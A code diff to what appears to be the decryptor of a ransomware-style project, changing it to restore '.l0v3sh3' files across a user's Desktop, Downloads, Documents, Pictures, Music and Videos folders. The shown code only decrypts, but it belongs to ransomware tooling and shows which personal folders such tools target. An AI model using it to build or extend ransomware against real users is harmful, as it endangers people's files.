@@ -64,14 +64,25 @@ def decrypt(dataFile, privateKeyFile):
         print(f"Deleted the encrypted file: {dataFile}")
 
 
-directory = './'  # CHANGE THIS
+# Define the list of directories to scan (Desktop, Downloads, Documents, Pictures, Music, Videos)
+user_home = Path.home()  # Get the user's home directory
+directories_to_scan = [
+    user_home / "Desktop",
+    user_home / "Downloads",
+    user_home / "Documents",
+    user_home / "Pictures",
+    user_home / "Music",
+    user_home / "Videos"
+]
 
 # Focus on files with .L0v3sh3 extension for decryption
 includeExtension = ['.l0v3sh3']  # Make sure the extension is lowercase
 
-for item in scanRecurse(directory): 
-    filePath = Path(item)
-    fileType = filePath.suffix.lower()
-    # Run the decryptor only if the file has .L0v3sh3 extension
-    if fileType in includeExtension:
-        decrypt(filePath, privateKeyFile)
+for directory in directories_to_scan:
+    if directory.exists():  # Check if the directory exists
+        for item in scanRecurse(directory):
+            filePath = Path(item)
+            fileType = filePath.suffix.lower()
+            # Run the decryptor only if the file has .L0v3sh3 extension
+            if fileType in includeExtension:
+                decrypt(filePath, privateKeyFile)
